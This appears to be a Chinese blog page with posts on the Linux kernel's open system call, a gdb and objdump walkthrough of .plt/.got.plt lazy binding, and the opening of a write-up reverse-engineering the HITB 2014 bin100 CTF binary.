<p>确定没有泄露 <a href="https://en.wikipedia.org/wiki/File_descriptor" target="_blank" rel="external">文件描述符</a>。默认地，通过一个 <code>execve</code> 系统调用，新的文件描述符会被设置为保持打开（状态），但 <code>open</code> 系统调用支持 <code>O_CLOSEXEC</code> 标志，这样可以被用来改变默认的操作行为。我们做这些是用来保护文件描述符，这样即使在一个线程中打开一个文件并设置 <code>O_CLOSEXEC</code> 标志并且同时第二个程序 <a href="https://en.wikipedia.org/wiki/Fork_\(system_call\" target="_blank" rel="external">fork</a>) + <a href="https://en.wikipedia.org/wiki/Exec_\(system_call\" target="_blank" rel="external">execve</a>) 操作时不会泄露文件描述符。你应该还记得子程序会有一份父程序文件描述符的副本。</p>
<p>接下来检查 flags 参数是否包含 <code>O_SYNC</code> 标志，（如果包含）则外加 <code>O_DSYNC</code> 标志：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (flags &amp; __O_SYNC)</span><br><span class="line">	flags |= O_DSYNC;</span><br></pre></td></tr></table></figure>
<p><code>O_SYNC</code> 标志确保在所有的数据写入到磁盘前，任何关于写的调用不会返回。<code>O_DSYNC</code> 和 <code>O_SYNC</code> 类似，但 (<code>O_DSYNC</code>) 没有要求所有将被写入的元数据（像 <code>atime</code>,<code>mtime</code> 等等）等待。所以在 Linux 内核里把 <code>O_DSYNC</code> + <code>__O_SYNC</code>,实现为 <code>__O_SYNC|O_DSYNC</code>。</p>
<p>接下来，必须确认用户是否想要创建一个临时文件，flags 参数应该会包含 <code>O_TMPFILE_MASK</code> 或者说，会包含 <code>O_CREAT</code> | <code>O_TMPFILE</code> 或者 <code>O_CREAT</code> &amp; <code>O_TMPFILE</code> 的运算结果，并且确保（文件）可写</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; __O_TMPFILE) &#123;</span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; O_TMPFILE_MASK) != O_TMPFILE)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (!(acc_mode &amp; MAY_WRITE))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; O_PATH) &#123;</span><br><span class="line">       	flags &amp;= O_DIRECTORY | O_NOFOLLOW | O_PATH;</span><br><span class="line">        acc_mode = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为在 man 手册中有提及：</p>
<blockquote>
<p>O_TMPFILE  must  be  specified  with one of O_RDWR or O_WRONLY</p>
</blockquote>
<p>如果没有传递 <code>O_TMPFILE</code> 标志去创建一个临时文件，在接下来的判断中检查 <code>O_PATH</code> 标志。<code>O_PATH</code> 标志允许我们在下列情形获得文件描述符：</p>
<ul>
<li>在文件系统(目录)树中指示一个位置</li>
<li>仅仅只在文件描述符层面执行操作</li>
</ul>
<p>在这种情况下文件自身是没有被打开的，但是像 <code>dup</code>, <code>fcntl</code> 等操作能被使用。因此如果想使用所有与文件内容相关的操作，像 <code>read</code>, <code>write</code> 等，就（必须）使用 <code>O_DIRECTORY | O_NOFOLLOW | O_PATH</code> 标志。现在我们已经在 <code>build_open_flags</code> 函数中分析完成了这些标志，我们可以使用下列代码填充我们的 <code>open_flags-&gt;open_flag</code> ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">op-&gt;open_flag = flags;</span><br></pre></td></tr></table></figure>
<p>现在我们已经填完了 <code>open_flag</code> 中表示对打开文件操作各种控制的 flags 字段和表示新建一个文件的 <code>umask</code> 的 <code>mode</code> 字段。接下来填充 <code>open_flags</code> 结构体中后面的字段。<code>op-&gt;acc_mode</code> 表示打开文件的权限，我们在 <code>build_open_flags</code> 里已经用初始值填完了 <code>acc_mode</code> 中的局部变量，接下来检查后面两个与权限相关的 flag：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; O_TRUNC)</span><br><span class="line">        acc_mode |= MAY_WRITE;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; O_APPEND)</span><br><span class="line">	acc_mode |= MAY_APPEND;</span><br><span class="line">op-&gt;acc_mode = acc_mode;</span><br></pre></td></tr></table></figure>
<p><code>O_TRUNC</code> 标志表示如果已打开的文件之前已经存在则删节为 0 ，<code>O_APPEND</code> 标志允许以 append mode (追加模式) 打开一个文件。因此在写已打开的文件会追加，而不是覆写。</p>
<p><code>open_flags</code> 中接下来的字段是 - <code>intent</code>。它允许我们知道我们的目的，换句话说就是我们真正想对文件做什么，打开，新建，重命名等等操作。如果我们的 flags 参数包含这个 <code>O_PATH</code> 标志，即我们不能对文件内容做任何事情，<code>open_flags</code> 会被设置为 0 ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">op-&gt;intent = flags &amp; O_PATH ? <span class="number">0</span> : LOOKUP_OPEN;</span><br></pre></td></tr></table></figure>
<p>否则 <code>open_flags</code> 会被设置为 <code>LOOKUP_OPEN</code>。如果我们想要新建文件，我们可以设置 <code>LOOKUP_CREATE</code>，并且使用 <code>O_EXEC</code> 标志来确认文件之前不存在：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; O_CREAT) &#123;</span><br><span class="line">	op-&gt;intent |= LOOKUP_CREATE;</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; O_EXCL)</span><br><span class="line">		op-&gt;intent |= LOOKUP_EXCL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>open_flags</code> 结构体里最后的标志是 <code>lookup_flags</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; O_DIRECTORY)</span><br><span class="line">	lookup_flags |= LOOKUP_DIRECTORY;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; O_NOFOLLOW))</span><br><span class="line">	lookup_flags |= LOOKUP_FOLLOW;</span><br><span class="line">op-&gt;lookup_flags = lookup_flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>如果我们想要打开一个目录，我们可以使用 <code>LOOKUP_DIRECTORY</code>；如果想要遍历但不想使用<a href="https://en.wikipedia.org/wiki/Symbolic_link" target="_blank" rel="external">软链接</a>，可以使用 <code>LOOKUP_FOLLOW</code>。这就是 <code>build_open_flags</code> 函数的全部内容了。<code>open_flags</code> 结构体也用各种与打开文件相关的 modes 和 flags 填完了。我们可以返回到 <code>do_sys_open</code> 函数。</p>
<h2><span id="打开文件的实际操作">打开文件的实际操作</span></h2><p>在 <code>build_open_flags</code> 函数完成后，我们为我们的文件建立了 flags 和 modes ，接下来我们在 <code>getname</code> 函数的帮助下得到 <code>filename</code> 结构体，得到传递给 <code>open</code> 系统调用的文件名：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tmp = getname(filename);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tmp))</span><br><span class="line">	<span class="keyword">return</span> PTR_ERR(tmp);</span><br></pre></td></tr></table></figure>
<p>getname 函数在 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/namei.c" target="_blank" rel="external">fs/namei.c</a> 源码文件中定义，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">struct</span> filename *</span><br><span class="line"><span class="title">getname</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> __user * filename)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getname_flags(filename, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数仅仅调用 <code>getname_flags</code> 函数然后返回它的结果。<code>getname_flags</code> 函数的主要目的是从用户空间复制文件路径到内核空间。<code>filename</code> 结构体被定义在 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/include/linux/fs.h" target="_blank" rel="external">include/linux/fs.h</a> 头文件中，包含以下字段：</p>
<ul>
<li>name - 指向内核空间的文件路径指针</li>
<li>uptr - 用户空间的原始指针</li>
<li>aname - 来自 audit 上下文的文件名</li>
<li>refcnt - 引用计数</li>
<li>iname - 文件名，长度小于 <code>PATH_MAX</code></li>
</ul>
<p>如上所述，<code>getname_flags</code> 函数使用 <code>strncpy_from_user</code> 函数复制传递给 <code>open</code> 系统调用的用户空间的文件名到内核空间。接下来就是获取新的空闲文件描述符：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd = get_unused_fd_flags(flags);</span><br></pre></td></tr></table></figure>
<p><code>get_unused_fd_flags</code> 函数获取当前程序打开文件的（文件描述符）表，系统中文件描述符 minimum (<code>0</code>) 和 maximum (<code>RLIMIT_NOFILE</code>) 可能的值和我们已传递到 <code>open</code> 系统调用的标志，并分配文件描述符，将其在当前进程的文件描述符表中的标记为忙碌状态。<code>get_unused_fd_flags</code> 函数设置或清除 <code>O_CLOEXEC</code> 标志取决于传递过来 flags 参数状态。</p>
<p><code>do_sys_open</code> 最后主要的步骤就是 <code>do_filp_open function</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> file *f = do_filp_open(dfd, tmp, &amp;op);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(f)) &#123;</span><br><span class="line">	put_unused_fd(fd);</span><br><span class="line">	fd = PTR_ERR(f);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	fsnotify_open(f);</span><br><span class="line">	fd_install(fd, f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>do_filp_open()</code> 函数主要解析给定的文件路径名到 <code>file</code> 结构体，<code>file</code> 结构体描述一个程序里已打开的文件。如果传过来的参数有误，则 <code>do_filp_open</code> 执行失败，并使用 <code>put_unused_fd</code> 释放文件描述符。如果 <code>do_filp_open()</code> 执行成功并返回 <code>file</code> 结构体，将会在当前程序的文件描述符表中存储这个 <code>file</code> 结构体。</p>
<p>现在让我们来简短看下 <code>do_filp_open()</code> 函数的实现。这个函数定义在 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/namei.c" target="_blank" rel="external">fs/namei.c</a> Linux 内核源码中，函数开始就初始化了 <code>nameidata</code> 结构体。这个结构体提供了一个链接到文件 <a href="https://en.wikipedia.org/wiki/Inode" target="_blank" rel="external">inode</a>。事实上，这就是一个 <code>do_filp_open()</code> 函数指针，这个函数通过传递到 <code>open</code> 系统调用的的文件名获取 <code>inode</code> ，在 <code>nameidata</code> 结构体被初始化后，<code>path_openat</code> 函数会被调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">filp = path_openat(&amp;nd, op, flags | LOOKUP_RCU);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(filp == ERR_PTR(-ECHILD)))</span><br><span class="line">	filp = path_openat(&amp;nd, op, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(filp == ERR_PTR(-ESTALE)))</span><br><span class="line">	filp = path_openat(&amp;nd, op, flags | LOOKUP_REVAL);</span><br></pre></td></tr></table></figure>
<p>注意 <code>path_openat</code> 会被调用了三次。事实上，Linux 内核会以 <a href="https://www.kernel.org/doc/Documentation/RCU/whatisRCU.txt" target="_blank" rel="external">RCU</a> 模式打开文件。这是最有效的打开文件的方式。如果打开失败，内核进入正常模式。第三次调用相对较少（出现），仅在 <a href="https://en.wikipedia.org/wiki/Network_File_System" target="_blank" rel="external">nfs</a>  文件系统中使用。<code>path_openat</code> 函数执行 <code>path lookup</code>，换句话说就是尝试寻找一个与路径相符合的 <code>dentry</code> (目录数据结构，Linux 内核用来追踪记录文件在目录里层次结构)。</p>
<p><code>path_openat</code> 函数从调用 <code>get_empty_flip()</code> 函数开始。<code>get_empty_flip()</code> 分配一个新 <code>file</code> 结构体并做一些额外的检查，像我们是否打开超出了系统中能打开的文件的数量等。在我们获得了已分配的新 <code>file</code> 结构体后，如果我们给 <code>open</code> 系统调用传递了 <code>O_TMPFILE</code> | <code>O_CREATE</code> 或 <code>O_PATH</code> 标志，则调用 <code>do_tmpfile</code> 或 <code>do_o_path</code> 函数。在我们想要打开已存在的文件和想要读写时这些情况是非常特殊的，因此我们仅考虑常见的情形。</p>
<p>正常情况下，会调用 <code>path_init</code> 函数。这个函数在进行真正的路径寻找前执行一些预备工作。包括寻找路径遍历中的开始的位置和元数据像路径中的 <code>inode</code> ，<code>dentry inode</code> 等。我们可能会遇到根目录的和当前目录的情形，因为我们使用 <code>AT_CWD</code> 作为开始指针（查阅本文前面调用 <code>do_sys_open</code> 部分）。</p>
<p><code>path_init</code> 之后是 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/namei.c#L3457" target="_blank" rel="external">loop</a>。loop 执行 <code>link_path_walk</code> 和 <code>do_last</code> 。<code>link_path_walk</code> 执行（文件）名解析，也就是说就是开始处理一个给定的路径。这个程序一步一步处理除了最后一个组成部分的文件路径。这个处理包括检查权限和获得文件组成。一旦一个文件的组成部分被获得，它会被传递给 <code>walk_component</code> ，这个函数从 <code>dcache</code> 更新当前的目录入口或询问底层文件系统。这样的处理过程一直重复到所有的路径组成部分。<code>link_path_walk</code> 执行后，<code>do_last</code> 函数会基于 <code>link_path_walk</code> 返回的结果填入一个 <code>file</code> 文件结构体。当我们处理完给定的文件路径中的最后一个组成部分，<code>do_last</code> 中的 <code>vfs_open</code> 函数将会被调用。</p>
<p><code>vfs_open</code> 这个函数定义在 <a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/fs/open.c" target="_blank" rel="external">fs/open.c</a> Linux 内核源文件中，主要的目的是调用一个底层文件系统的打开操作。</p>
<p>自此我们的讨论结束了，我们不考虑<strong>完整</strong>的 <code>open</code> 系统调用的实现。我们跳过了一些内容，像从挂载的文件系统打开文件的处理条件，解析软链接等，但去查阅这些处理特征应该不会很难。这些要素不包括在<strong>通用的</strong> <code>open</code> 系统调用实现中，具体特征取决于底层文件系统。如果你对此感兴趣，可查阅 <code>file_operations.open</code> 回调函数获得关于 <a href="https://github.com/torvalds/linux/tree/master/fs" target="_blank" rel="external">filesystem</a> 更确切的描述。</p>
<h2><span id="总结">总结</span></h2><p>Linux 内核中关于不同系统调用的实现的第五部分已经完成了。如果你有任何问题, 可通过 twitter 或邮箱与我联系，<a href="https://twitter.com/0xAX" target="_blank" rel="external">@0xAX</a>/<a href="anotherworldofworld@gmail.com">email</a>, 或者提交一个 <a href="https://github.com/0xAX/linux-internals/issues/new" target="_blank" rel="external">issue</a>. 在接下来的部分, 我们将继续深究 Linux 内核中的系统调用并且看看 <a href="http://man7.org/linux/man-pages/man2/read.2.html" target="_blank" rel="external">read</a> 系统调用的实现。</p>
<p><strong>请谅解英语不是我的母语，对于任何不恰当的表述我深感抱歉。如果你发现任何错误，请在 <a href="https://github.com/0xAX/linux-internals" target="_blank" rel="external">linux-insides</a> 给我发 PR  。</strong></p>
<h2><span id="参考链接">参考链接</span></h2><ul>
<li><a href="https://en.wikipedia.org/wiki/System_call" target="_blank" rel="external">system call</a></li>
<li><a href="http://man7.org/linux/man-pages/man2/open.2.html" target="_blank" rel="external">open</a></li>
<li><a href="https://en.wikipedia.org/wiki/File_descriptor" target="_blank" rel="external">file descriptor</a></li>
<li><a href="https://en.wikipedia.org/wiki/Procfs" target="_blank" rel="external">proc</a></li>
<li><a href="https://www.gnu.org/software/libc/manual/html_mono/libc.html#File-Position-Primitive" target="_blank" rel="external">GNU C Library Reference Manual</a></li>
<li><a href="https://en.wikipedia.org/wiki/IA-64" target="_blank" rel="external">IA-64</a> </li>
<li><a href="https://en.wikipedia.org/wiki/X86-64" target="_blank" rel="external">x86_64</a></li>
<li><a href="http://man7.org/linux/man-pages/man3/opendir.3.html" target="_blank" rel="external">opendir</a></li>
<li><a href="http://man7.org/linux/man-pages/man7/fanotify.7.html" target="_blank" rel="external">fanotify</a></li>
<li><a href="https://en.wikipedia.org/wiki/Fork_\(system_call\" target="_blank" rel="external">fork</a>)</li>
<li><a href="https://en.wikipedia.org/wiki/Exec_\(system_call\" target="_blank" rel="external">execve</a>)</li>
<li><a href="https://en.wikipedia.org/wiki/Symbolic_link" target="_blank" rel="external">symlink</a></li>
<li><a href="https://linux.die.net/man/8/auditd" target="_blank" rel="external">audit</a></li>
<li><a href="https://en.wikipedia.org/wiki/Inode" target="_blank" rel="external">inode</a></li>
<li><a href="https://www.kernel.org/doc/Documentation/RCU/whatisRCU.txt" target="_blank" rel="external">RCU</a></li>
<li><a href="http://man7.org/linux/man-pages/man2/read.2.html" target="_blank" rel="external">read</a></li>
<li><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/syscall-4.html" target="_blank" rel="external">previous part</a></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/07/24/pltgot/" itemprop="url">
                  .plt/.got.plt及延迟绑定重定位技术详解
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2018-07-24T15:30:00+08:00" content="2018-07-24">
              2018-07-24
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/Compiler/" itemprop="url" rel="index">
                    <span itemprop="name">Compiler</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2018/07/24/pltgot/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/07/24/pltgot/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>之前做的一个验证实验，直观了解下延迟绑定重定位技术。</p>
<h1><span id="pltgotplt">.plt/.got.plt</span></h1><p>.plt存储的是过程连接表 (Procedure Linkege Table,PLT) 。包含了共享库函数地址解析的代码。每个 PLT entry 对应一个function的解析。</p>
<p>.got.plt存储着全局偏移表。每个 entry 存储着一个函数的实际地址，其中前3个 entry 是特殊的。</p>
<ul>
<li>GOT[0]:存放了指向可执行文件动态段的地址</li>
<li>GOT[1]:存放link_map结构的地址</li>
<li>GOT[2]:存放了指向动态链接器_dl_runtime_resolve()函数的地址</li>
</ul>
<h1><span id="示例分析">示例分析</span></h1><p>.plt和.got.plt共同构成了共享库重定位延迟绑定技术，实现了对共享库的动态解析。这里以调用write()函数为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">write(STDOUT_FILENO,&quot;Hello,World\n&quot;,13);</span><br><span class="line">write(STDOUT_FILENO,&quot;Second run\n&quot;,12);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#compiler</span><br><span class="line">gcc -z norelro -no-pie -fno-stack-protector -g -o test_plt_got test_plt_got.c</span><br></pre></td></tr></table></figure></p>
<p>这个程序会连续两次调用write()函数。</p>
<h2><span id="查看-plt">查看 .plt</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$objdump -d -j .plt ./test_plt_got</span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080482d0 &lt;.plt&gt;:</span><br><span class="line">80482d0:       ff 35 a8 97 04 08       pushl  0x80497a8</span><br><span class="line">80482d6:       ff 25 ac 97 04 08       jmp    *0x80497ac</span><br><span class="line">80482dc:       00 00                   add    %al,(%eax)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">08048300 &lt;write@plt&gt;:</span><br><span class="line">8048300:       ff 25 b8 97 04 08       jmp    *0x80497b8</span><br><span class="line">8048306:       68 10 00 00 00          push   $0x10</span><br><span class="line">804830b:       e9 c0 ff ff ff          jmp    80482d0 &lt;.plt&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="查看-gotplt">查看 .got.plt</span></h2><p>*0x80497b8存储的就是write()的.got.plt entry 地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$objdump -R ./test_plt_got</span><br><span class="line"></span><br><span class="line">./test_plt_got:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE</span><br><span class="line">080497a0 R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">080497b0 R_386_JUMP_SLOT   read@GLIBC_2.0</span><br><span class="line">080497b4 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">080497b8 R_386_JUMP_SLOT   write@GLIBC_2.0</span><br></pre></td></tr></table></figure></p>
<h1><span id="运行过程解析">运行过程解析</span></h1><p>peda-gdb 调试，b write@plt 下断点，r运行，解析过程如下：</p>
<h3><span id="1程序运行第一次调用write函数调用writeplt-reffigplt1_png">1.程序运行，第一次调用write()函数，调用write@plt() \ref{fig:plt1_PNG}</span></h3><p><img src="/images/pltgot/plt1.PNG" alt="调用write@plt"></p>
<h3><span id="2plt-代码做一次到-got-中地址的间接跳转jmp-0x80497b8-即-writegot-地址为0x80497b8">2.PLT 代码做一次到 GOT 中地址的间接跳转：jmp *0x80497b8 , 即 write@got 地址为0x80497b8</span></h3><p>x 0x80497b8,可以发现存储的数据为0x8048306,也就是write@plt的第二行指令<br><img src="/images/pltgot/plt2.PNG" alt="0x80497b8存储的数据"></p>
<h3><span id="3这样就又回到了-plt-代码执行push-0x10">3.这样就又回到了 PLT 代码，执行push 0x10</span></h3><h3><span id="4执行-plt-第三行代码jmp-0x80482d0跳转到-plt0">4.执行 PLT 第三行代码：jmp 0x80482d0，跳转到 PLT[0]</span></h3><p>查看 PLT[0] 前两行涉及到的指针，查看其存储的数据分别为：0xb7fff920;0xb7fee2f0<br><img src="/images/pltgot/plt3.PNG" alt="PLT[0]"></p>
<h3><span id="5plt0-第一行指令-push-got1-的地址该地址中存放了指向link_map的偏移地址">5.PLT[0] 第一行指令 push GOT[1] 的地址，该地址中存放了指向link_map的偏移地址</span></h3><h3><span id="6plt0-第二行指令跳转到-got2-存放的地址该地址指向了动态链接器的-_dl_runtime_resolve-函数">6.PLT[0] 第二行指令跳转到 GOT[2] 存放的地址，该地址指向了动态链接器的 _dl_runtime_resolve() 函数</span></h3><p>_dl_runtime_resolve() 会将write()函数真正的内存地址加到 GOT entry 中<br><img src="/images/pltgot/plt4.PNG" alt="重定位write()"></p>
<h3><span id="7第二次调用write函数时可以发现-writeplt-将直接跳转到-glibc-中的-write-函数地址0xb7ead760">7.第二次调用write()函数时，可以发现 write@plt 将直接跳转到 glibc 中的 write() 函数地址0xb7ead760</span></h3><p><img src="/images/pltgot/plt5.PNG" alt="重定位write()"></p>
<h1><span id="参考">参考</span></h1><ul>
<li>Learning Linux Binary Analysis.Ryan O’Neill</li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/07/21/ldpreload-2014hitb_bin100/" itemprop="url">
                  详解2014hitb_bin100.elf，LD_PRELOAD注入so
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2018-07-21T18:30:00+08:00" content="2018-07-21">
              2018-07-21
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/CTF-Linux/" itemprop="url" rel="index">
                    <span itemprop="name">CTF,Linux,</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2018/07/21/ldpreload-2014hitb_bin100/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/07/21/ldpreload-2014hitb_bin100/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>本来是想了解下 LD_PRELOAD 注入 so 的。断断续续磕了几天，静下心来总算把程序给摸清了，有一种豁然释怀的感觉，满足。</p>
<h1><span id="1前期侦测">1.前期侦测</span></h1><p>hitb_bin100.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=99a4be07e428a159472b8e4b3508476feab70e8b, not stripped</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Canary                        : Yes</span><br><span class="line">NX                            : Yes</span><br><span class="line">PIE                           : No</span><br><span class="line">Fortify                       : Yes</span><br><span class="line">RelRO                         : Partial</span><br></pre></td></tr></table></figure>
<p>运行发现，程序一直在输出一些逆序的字符串，查了下发现是 YTCrack 的 LulzSec Anthem Song, 当时去云音乐查，还没有，果断 @云村曲库君啊，一个小时后就补上了，还是蛮惊喜的，生活小乐趣吧，哈哈。</p>
<h1><span id="2ida-分析及探索尝试">2.IDA 分析及探索尝试</span></h1><p>从 main 函数入手，汇编代码大致流程如下：</p>
<ol>
<li>store_time_ret:0x4007d8</li>
<li>rand_call_funny:0x400719</li>
<li>print_funny_sleep:0x400783</li>
</ol>
<p>接下来我直接 patch 了程序，直接 call print_flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KEY: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">OK YOU WIN. HERE&apos;S YOUR FLAG: iYSg.&apos;J%+i,7&quot;rmn~uJ    -</span><br></pre></td></tr></table></figure></p>
